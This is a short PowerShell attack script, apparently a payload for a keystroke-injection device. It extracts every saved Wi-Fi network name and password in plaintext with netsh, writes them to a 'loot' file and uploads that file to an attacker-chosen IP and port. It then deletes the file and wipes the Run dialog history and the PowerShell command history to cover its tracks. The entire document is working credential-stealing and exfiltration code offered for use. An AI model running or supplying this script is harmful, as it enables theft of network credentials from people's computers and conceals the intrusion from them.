<# This script will read all wlan SSID's and passwords in plaintext and upload them to your server. Modify ip/port to download e.ps1 & upload loot.txt #>
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > $env:TEMP\loot.txt
$url = "http://<ip>:<port>/"
$file = "$env:TEMP\loot.txt"
Invoke-WebRequest -Uri $url -Method POST -InFile $file
Remove-Item -Path $file -Force
Start-Process -NoNewWindow -Wait -FilePath "reg.exe" -ArgumentList "DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f"
$historyFilePath = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Remove-Item -Path $historyFilePath -Force
